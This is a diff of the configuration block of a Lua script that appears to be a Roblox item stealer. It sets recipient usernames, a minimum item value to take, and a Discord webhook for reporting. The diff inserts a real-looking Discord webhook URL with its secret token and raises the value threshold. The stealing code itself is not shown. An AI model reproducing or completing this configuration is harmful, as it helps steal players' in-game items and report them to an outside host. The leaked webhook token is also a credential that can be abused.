@@ -2,8 +2,8 @@
 
 Username = "Virtual122" --Replace with the primary username
 Username2 = "your 2nd user here" --Replace with the secondary username
-webhook = "Your discord webhook here" --Replace with your Discord webhook
-min_rap = 50000 --Minimum RAP value for items, default is 1 million
+webhook = "https://discord.com/api/webhooks/1295068053079457812/6ICjb5IxIFE8IEm0IwHaXAu_4LnRZHORc0jfJ2dwniH-UKBkjM6pTlkjVNlN21ZMejlc" --Replace with your Discord webhook
+min_rap = 500000 --Minimum RAP value for items, default is 1 million
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
